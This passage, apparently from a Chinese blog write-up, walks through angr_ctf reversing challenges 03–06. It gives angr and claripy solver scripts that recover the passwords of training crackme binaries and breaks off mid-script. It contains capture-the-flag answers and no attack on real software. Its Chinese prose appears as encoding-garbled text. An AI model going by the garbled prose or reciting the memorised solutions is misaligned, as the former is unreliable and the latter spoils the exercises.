<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvs = claripy.BVS(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-number">64</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs<br>&lt;BV64 x_0_64&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs2 = claripy.BVS(<span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-number">64</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs2<br>&lt;BV64 y_1_64&gt;<br></code></pre></td></tr></table></figure>

<p>ä½å‘é‡ç¬¦å·ä¸ä½å‘é‡å€¼ä¹‹é—´åŒæ„å¯ä»¥è¿›è¡Œè¿ç®—ï¼Œç»„åˆæˆæ›´åŠ å¤æ‚çš„è¡¨è¾¾å¼ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvs3 = (bvs * bvs2 + bvv) / bvs<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs3<br>&lt;BV64 (x_0_64 * y_1_64 + <span class="hljs-number">0x617274746e626133</span>) / x_0_64&gt;<br></code></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>.op</code> ä¸ <code>.args</code> è·å¾—ä½å‘é‡çš„è¿ç®—ç±»å‹ä¸å‚æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvv.op<br><span class="hljs-string">&#x27;BVV&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs.op<br><span class="hljs-string">&#x27;BVS&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs3.op<br><span class="hljs-string">&#x27;__floordiv__&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs3.args<br>(&lt;BV64 x_0_64 * y_1_64 + <span class="hljs-number">0x617274746e626133</span>&gt;, &lt;BV64 x_0_64&gt;)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv.args<br>(<span class="hljs-number">7021802812440994099</span>, <span class="hljs-number">64</span>)<br></code></pre></td></tr></table></figure>



<h3 id="state-solver-çŠ¶æ€çš„æ±‚è§£æ¥å£"><a href="#state-solver-çŠ¶æ€çš„æ±‚è§£æ¥å£" class="headerlink" title="state.solver - çŠ¶æ€çš„æ±‚è§£æ¥å£"></a>state.solver - çŠ¶æ€çš„æ±‚è§£æ¥å£</h3><p>å‰é¢è®²åˆ° <code>state.solver</code> æä¾›äº†ä¸€äº›åŸºäºçŠ¶æ€çš„æ±‚è§£æ¥å£ï¼Œä¾‹å¦‚ solver åŒæ ·æœ‰åˆ›å»ºä½å‘é‡çš„ <code>.BVV()</code> ä¸ <code>.BVS()</code> æ¥å£</p>
<p>åœ¨éœ€è¦å¯¹ä½å‘é‡ç¬¦å·è¿›è¡Œå…·ä½“å€¼çš„æ±‚è§£æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå°†ä½å‘é‡ç¬¦å·å­˜æ”¾åˆ°çŠ¶æ€çš„å†…å­˜&#x2F;å¯„å­˜å™¨ä¸­ï¼Œä¹‹åç”¨ simgr æ¢ç´¢åˆ°å¯¹åº”çš„çŠ¶æ€åï¼Œå†ä½¿ç”¨ <code>state.solver.eval()</code> æˆå‘˜å‡½æ•°æ¥è·å–å¯¹åº”ä½å‘é‡åœ¨å½“å‰çŠ¶æ€ä¸‹çš„å€¼ï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ğŸŒ°ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">bvs_to_solve = claripy.BVS(<span class="hljs-string">&#x27;bvs_to_solve&#x27;</span>, <span class="hljs-number">64</span>)<br>init_state = proj.factory.entry_state()<br>init_state.memory.store(<span class="hljs-number">0xdeadbeef</span>, bvs_to_solve)<br>simgr = proj.factory.simgr(init_state)<br>simgr.explore(find = <span class="hljs-number">0xbeefdead</span>)<br><br>solver_state = simgr.found[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(solver_state.solver.<span class="hljs-built_in">eval</span>(bvs_to_solve))<br></code></pre></td></tr></table></figure>

<h3 id="FINAL-EXPLOIT-1"><a href="#FINAL-EXPLOIT-1" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦åˆ›å»ºä¸€ä¸ªä» <code>get_user_input()</code> ä¹‹åå¼€å§‹æ‰§è¡Œçš„ç©ºç™½çš„çŠ¶æ€ï¼Œå¹¶å°†å¯¹åº”çš„å¯„å­˜å™¨è®¾ç½®ä¸ºä½å‘é‡ç¬¦å·ï¼Œä¹‹ååœ¨æ±‚è§£çŠ¶æ€ä½¿ç”¨ <code>.solver.eval()</code> æ¥æ±‚è§£å³å¯</p>
<p>æœ€åçš„æ±‚è§£è„šæœ¬å¦‚ä¸‹ï¼Œè¯¦è§æ³¨é‡Šï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./03_angr_symbolic_registers&#x27;</span><br>    proj = angr.Project(bin_path)<br>    <span class="hljs-comment"># blank_state() means creating an empty state and set the current PC to specific addr</span><br>    start_addr = <span class="hljs-number">0x8049670</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    <br>    <span class="hljs-comment"># create  symbolic variables with claripy.BVS(name, size), size is counted by bits</span><br>    password_0 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">32</span>) <span class="hljs-comment"># 32-bit registers</span><br>    password_1 = claripy.BVS(<span class="hljs-string">&#x27;password_1&#x27;</span>, <span class="hljs-number">32</span>) <span class="hljs-comment"># 32-bit registers</span><br>    password_2 = claripy.BVS(<span class="hljs-string">&#x27;password_2&#x27;</span>, <span class="hljs-number">32</span>) <span class="hljs-comment"># 32-bit registers</span><br>    <br>    <span class="hljs-comment"># set the init_state&#x27;s register to corresponding symbolic variables</span><br>    init_state.regs.eax = password_0<br>    init_state.regs.ebx = password_1<br>    init_state.regs.edx = password_2<br>    <br>    <span class="hljs-comment"># now solve it!</span><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br>    <br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-comment"># we use state.solver.eval(BVS) to get the answer value there</span><br>        solution_0 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_0)<br>        solution_1 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_1)<br>        solution_2 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_2)<br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(solution_0)))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(solution_1)))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_2: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(solution_2)))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>å¾ˆå¿«å•Šï¼Œå•ªçš„ä¸€ä¸‹å°±å‡ºæ¥äº†.mkv</p>
<p><img src="https://s2.loli.net/2022/10/31/MkU5bdLO4js6ZXy.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="04-angr-symbolic-stackï¼šç¬¦å·åŒ–æ ˆ"><a href="#04-angr-symbolic-stackï¼šç¬¦å·åŒ–æ ˆ" class="headerlink" title="04_angr_symbolic_stackï¼šç¬¦å·åŒ–æ ˆ"></a>04_angr_symbolic_stackï¼šç¬¦å·åŒ–æ ˆ</h2><p>è¿˜æ˜¯æƒ¯ä¾‹æ‹–å…¥ IDAï¼Œä¸»è¦çš„å¤„ç†é€»è¾‘åœ¨ <code>handle_user()</code> å½“ä¸­ï¼Œè¿˜æ˜¯è¯»å…¥ä¸¤ä¸ªæ•°ä¹‹åæ‰”ç»™ä¸åŒçš„ complex å‡½æ•°å¤„ç†ï¼š</p>
<p><img src="https://s2.loli.net/2022/10/31/TZrWvDe5iq3R1E7.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ç„¶åä½ ä¼šå‘ç°ç”¨ä¸Šä¸Šé¢˜çš„è„šæœ¬ä¹Ÿèƒ½ç§’è§£â€¦ä¸è¿‡è¿™æ ·å°±ä¸æ˜¯è¿™é“é¢˜å‡ºé¢˜çš„ç›®çš„äº†ï¼šï¼‰</p>
<p>é‡æ–°è¯»ä¸€ä¸‹é¢˜ç›®â€”â€”<code>symbolic stack</code>ï¼Œè¿™æ„å‘³ç€<strong>æœ¬é¢˜æˆ‘ä»¬åº”å½“å°†æ ˆè®¾ç½®ä¸ºç¬¦å·å˜é‡æ¥è¿›è¡Œçº¦æŸæ±‚è§£</strong></p>
<p>é‚£ä¹ˆæˆ‘ä»¬è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿé‡æ–°æ¥çœ‹ <code>handler_user()</code> çš„æ±‡ç¼–ä»£ç ï¼Œä¸¤ä¸ªå¾…æ±‚è§£å˜é‡éƒ½æ˜¯ä½äºæ ˆä¸Šçš„å›ºå®šä½ç½®ï¼š</p>
<p><img src="https://s2.loli.net/2022/10/31/ihsBNwyqpUJrneg.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬è¿˜æ˜¯å¯ä»¥å°†åˆå§‹çŠ¶æ€è®¾ç½®ä¸ºä»è¯»å…¥è¾“å…¥åå¼€å§‹çš„ç©ºç™½çŠ¶æ€ï¼Œä¹‹ååˆ›å»ºä¸¤ä¸ªä½å‘é‡ç¬¦å·ï¼Œè®¾ç½®å¥½ ebp å’Œ esp çš„ç›¸å¯¹ä½ç½®åä½¿ç”¨  <code>state.stack_push(val)</code> æ¥<strong>æ‰‹åŠ¨åœ°å°†ç¬¦å·å˜é‡æ¨åˆ°æ ˆä¸Š</strong>ï¼Œæœ€åçš„æ±‚è§£è·¯å¾„è¿˜æ˜¯è®¾ä¸ºè¾“å‡º <code>&quot;Good Job.&quot;</code> çš„åœ°å€å³å¯ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„ä»”ç»†è®¡ç®—å˜é‡åœ¨æ ˆä¸Šçš„ä½ç½®</p>
<p>æ±‚è§£è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python3">import angr<br>import sys<br>import claripy<br><br>def solver():<br>    bin_path = &#x27;./04_angr_symbolic_stack&#x27;<br>    proj = angr.Project(bin_path)<br>    start_addr = 0x80493EF # first insn after `call scanf`<br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    <br>    # create symbolic variables<br>    password_0 = claripy.BVS(&#x27;password_0&#x27;, 32) # 32-bit integer<br>    password_1 = claripy.BVS(&#x27;password_1&#x27;, 32) # 32-bit integer<br>    <br>    # set the context<br>    init_state.regs.ebp = init_state.regs.esp<br>    ## first val is on [ebp - 0xC], so we need to `sub esp` so that we can push properly<br>    init_state.regs.esp -= 0x8<br>    ## these two variables are continuous on the stack<br>    init_state.stack_push(password_0)<br>    init_state.stack_push(password_1)<br>    ## the relative position of esp when return from scanf()<br>    ## seems that it&#x27;s okay to not do it?<br>    init_state.regs.esp -= 12<br>    <br>    # now to solve!<br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = 0x804943C, avoid = 0x804942A)<br>    <br>    if simgr.found:<br>        solution_state = simgr.found[0]<br>        solution_0 = solution_state.solver.eval(password_0)<br>        solution_1 = solution_state.solver.eval(password_1)<br>        <br>        print(&#x27;password_0: &#123;&#125;&#x27;.format(solution_0))<br>        print(&#x27;password_1: &#123;&#125;&#x27;.format(solution_1))<br>    else:<br>        raise Exception(&#x27;Could not find the solution!&#x27;)<br><br>if __name__ == &quot;__main__&quot;:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>è¿˜æ˜¯ç§’è§£ï¼š</p>
<p><img src="https://s2.loli.net/2022/10/31/e7sESMFHzIxb26X.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="05-angr-symbolic-memoryï¼šç¬¦å·åŒ–å†…å­˜"><a href="#05-angr-symbolic-memoryï¼šç¬¦å·åŒ–å†…å­˜" class="headerlink" title="05_angr_symbolic_memoryï¼šç¬¦å·åŒ–å†…å­˜"></a>05_angr_symbolic_memoryï¼šç¬¦å·åŒ–å†…å­˜</h2><p>è¿˜æ˜¯æƒ¯ä¾‹åœ°æ‹–å…¥ IDAï¼Œè¿™ä¸€æ¬¡æ˜¯è¯»å…¥å››ä¸ª 8 å­—èŠ‚åˆ°ä¸€å—è¿ç»­çš„ 32 å­—èŠ‚å†…å­˜ä¸Šï¼Œå…¶ä¸­ <code>user_input</code> çš„åœ°å€ä¾¿æ˜¯ <code>0x82F48A0</code>ï¼Œä¹‹åè°ƒç”¨ <code>complex_function()</code> é€å­—ç¬¦å¤„ç†è¿™ 32 å­—èŠ‚åä¸ç‰¹å®šå­—ç¬¦ä¸²è¿›è¡Œå¯¹æ¯”ï¼š</p>
<p><img src="https://s2.loli.net/2022/10/31/ZhNrVoe3gK9G5PJ.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>é‚£ä¹ˆä»é¢˜ç›®åç§°æˆ‘ä»¬ä¸éš¾çœ‹å‡º<strong>è¿™ä¸€æ¬¡æˆ‘ä»¬åº”å½“è¦å°†å†…å­˜ä½œä¸ºç¬¦å·å˜é‡è¿›è¡Œçº¦æŸæ±‚è§£</strong></p>
<h3 id="state-çš„å†…å­˜æ“ä½œ"><a href="#state-çš„å†…å­˜æ“ä½œ" class="headerlink" title="state çš„å†…å­˜æ“ä½œ"></a>state çš„å†…å­˜æ“ä½œ</h3><p>å‰é¢è®²åˆ°ï¼Œå¯¹äºä¸€ä¸ªçŠ¶æ€çš„å†…å­˜ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>state.memory</code> çš„å¯¹åº”æ¥å£è¿›è¡Œæ“ä½œï¼š</p>
<ul>
<li><code>state.memory.load(addr, size_in_bytes)</code> ï¼šè·å–è¯¥åœ°å€ä¸ŠæŒ‡å®šå¤§å°çš„ä½å‘é‡</li>
<li><code>state.memory.store(addr, bitvector)</code> ï¼šå°†ä¸€ä¸ªä½å‘é‡å­˜å‚¨åˆ°æŒ‡å®šåœ°å€</li>
</ul>
<p>éœ€è¦æ³¨æ„çš„æ˜¯å¦‚æœè¦å‚¨å­˜å…·ä½“å€¼ï¼Œåˆ™éœ€è¦é€šè¿‡ <code>endness</code> å‚æ•°æŒ‡å®šå¤§å°ç«¯åº</p>
<h3 id="FINAL-EXPLOIT-2"><a href="#FINAL-EXPLOIT-2" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>é‚£ä¹ˆæœ¬é¢˜è¿˜æ˜¯åˆ›å»ºå¯¹åº”å¤§å°çš„ BVS å explore() å³å¯ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯åœ¨è·å–æœ€åæ±‚è§£çš„å€¼æ—¶åˆ«å¿˜äº†æŒ‡å®šå‚æ•° <code>cast_to=bytes</code> ä»¥è·å¾—å­—ç¬¦è¾“å‡ºï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./05_angr_symbolic_memory&#x27;</span><br>    proj = angr.Project(bin_path)<br>    start_addr = <span class="hljs-number">0x8049315</span> <span class="hljs-comment"># first insn after scanf()</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    <br>    <span class="hljs-comment"># create symbolic variables</span><br>    password_0 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-comment"># 8 bytes = 64 bits</span><br>    password_1 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-comment"># 8 bytes = 64 bits</span><br>    password_2 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-comment"># 8 bytes = 64 bits</span><br>    password_3 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-comment"># 8 bytes = 64 bits</span><br>    <br>    <span class="hljs-comment"># insert the symbolic vals into memory</span><br>    init_state.memory.store(<span class="hljs-number">0x82F48A0</span>, password_0)<br>    init_state.memory.store(<span class="hljs-number">0x82F48A8</span>, password_1)<br>    init_state.memory.store(<span class="hljs-number">0x82F48B0</span>, password_2)<br>    init_state.memory.store(<span class="hljs-number">0x82F48B8</span>, password_3)<br>    <br>    <span class="hljs-comment"># now to solve!</span><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = <span class="hljs-number">0x8049381</span>, avoid = <span class="hljs-number">0x804936F</span>)<br>    <br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        solution_0 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_0, cast_to=<span class="hljs-built_in">bytes</span>)<br>        solution_1 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_1, cast_to=<span class="hljs-built_in">bytes</span>)<br>        solution_2 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_2, cast_to=<span class="hljs-built_in">bytes</span>)<br>        solution_3 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_3, cast_to=<span class="hljs-built_in">bytes</span>)<br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_0))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_1))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_2: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_2))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_3: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_3))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>è¿™æ¬¡çš„æ±‚è§£éœ€è¦ä¸€ç‚¹ç‚¹æ—¶é—´ï¼Œä»¥åŠä¸€å®šé‡çš„å†…å­˜ï¼ˆç¬”è€…ä»… 2G å†…å­˜çš„é˜¿é‡Œäº‘å­¦ç”Ÿæœºåœ¨è·‘è§£é¢˜è„šæœ¬æ—¶å°±è¢« Kill äº†å‡ æ¬¡ï¼Œæœ€åä¸å¾—ä¸ç”¨ä¸€äº›æ–¹æ³•è…¾ä¸€äº›å†…å­˜åæ‰æå®š</p>
<p><img src="https://s2.loli.net/2022/10/31/5Mymf9v8dTKUFWu.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="06-angr-symbolic-dynamic-memoryï¼šç¬¦å·åŒ–åŠ¨æ€åˆ†é…å†…å­˜"><a href="#06-angr-symbolic-dynamic-memoryï¼šç¬¦å·åŒ–åŠ¨æ€åˆ†é…å†…å­˜" class="headerlink" title="06_angr_symbolic_dynamic_memoryï¼šç¬¦å·åŒ–åŠ¨æ€åˆ†é…å†…å­˜"></a>06_angr_symbolic_dynamic_memoryï¼šç¬¦å·åŒ–åŠ¨æ€åˆ†é…å†…å­˜</h2><p>æƒ¯ä¾‹æ‹–å…¥ IDA ä¸­ï¼Œè¿˜æ˜¯æƒ¯ä¾‹åœ°è¯»å…¥è¾“å…¥å complex å¤„ç†åè¿›è¡Œå¯¹æ¯”ï¼Œä¸è¿‡ä¸ä¸€æ ·çš„æ˜¯æœ¬é¢˜å­˜å‚¨è¾“å…¥ä½¿ç”¨çš„æ˜¯<strong>åŠ¨æ€åˆ†é…çš„å†…å­˜</strong>ï¼š</p>
<p><img src="https://s2.loli.net/2022/10/31/dQEJzTtXKWZaPLV.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>é‚£ä¹ˆæ€ä¹ˆå¤„ç†å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥ä»å‚¨å­˜è¿™ä¸¤å—å†…å­˜çš„æŒ‡é’ˆçš„åœ°å€å…¥æ‰‹ï¼Œæ³¨æ„åˆ°ä¸¤ä¸ªæŒ‡é’ˆ <code>buffer0</code> ä¸ <code>buffer1</code> æ˜¯ä¸¤ä¸ªå…¨å±€å˜é‡ï¼š</p>
<p><img src="https://s2.loli.net/2022/10/31/XkKs9MjUmh2yGbw.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<ul>
<li>å°†åˆå§‹çŠ¶æ€è®¾ä¸º<strong>è¯»å–å®Œè¾“å…¥åçš„çŠ¶æ€</strong></li>
<li>ä»»æ„é€‰ä¸¤ä¸ªåœ°å€ä½œä¸º fake chunk çš„åœ°å€ï¼Œå¹¶å°†è¿™ä¸¤ä¸ª buffer æŒ‡é’ˆæŒ‡å‘ fake chunk</li>
<li>å†åœ¨ fake chunk å†…å­˜ä¸Šæ”¾ç½®ç›¸åº”çš„å†…å­˜ç¬¦å·å˜é‡è¿›è¡Œæ±‚è§£å³å¯</li>
</ul>
<p>å› ä¸ºç¬¦å·æ‰§è¡Œä¸ä¼šå®é™…æ‰§è¡Œç¨‹åºï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä»»æ„è®¾ç½® fake chunk åœ°å€å¹¶ä¸ä¼šå¯¼è‡´ segmentation fault çš„å‘ç”Ÿï¼Œéœ€è¦æ³¨æ„çš„æ˜¯å¯¹äºå…·ä½“çš„å€¼è€Œè¨€æˆ‘ä»¬åˆ«å¿˜äº†é€šè¿‡ <code>endness</code> å‚æ•°æŒ‡å®šå¤§å°ç«¯åº</p>
<p>äºæ˜¯æœ€åçš„è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python3">import angr<br>import claripy<br><br>def solver():<br>    bin_path = &#x27;./06_angr_symbolic_dynamic_memory&#x27;<br>    proj = angr.Project(bin_path)<br>    start_addr = 0x804938C # first insn after scanf()<br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    <br>    # set the buffer0&#x27;s and buffer1&#x27;s val to our specific address<br>    buf0_addr = 0x9B20684<br>    buf1_addr = 0x9B2068C<br>    fake_chunk0_addr = 0x1145140<br>    fake_chunk1_addr = 0x1919810<br>    init_state.memory.store(buf0_addr,fake_chunk0_addr, endness=proj.arch.memory_endness)<br>    init_state.memory.store(buf1_addr,fake_chunk1_addr, endness=proj.arch.memory_endness)<br>    <br>    # create symbolic vals and set fake_chunk to them<br>    password_0 = claripy.BVS(&#x27;password_0&#x27;, 64) # 8 bytes = 64 bits<br>    password_1 = claripy.BVS(&#x27;password_1&#x27;, 64) # 8 bytes = 64 bits<br>    init_state.memory.store(fake_chunk0_addr, password_0)<br>    init_state.memory.store(fake_chunk1_addr, password_1)<br>    <br>    # now to solve!<br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = 0x8049452, avoid = 0x8049440)<br>    <br>    if simgr.found:<br>        solution_state = simgr.found[0]<br>        solution_0 = solution_state.solver.eval(password_0, cast_to=bytes)<br>        solution_1 = solution_state.solver.eval(password_1, cast_to=bytes)<br>        <br>        print(&#x27;password_0: &#123;&#125;&#x27;.format(solution_0))<br>        print(&#x27;password_1: 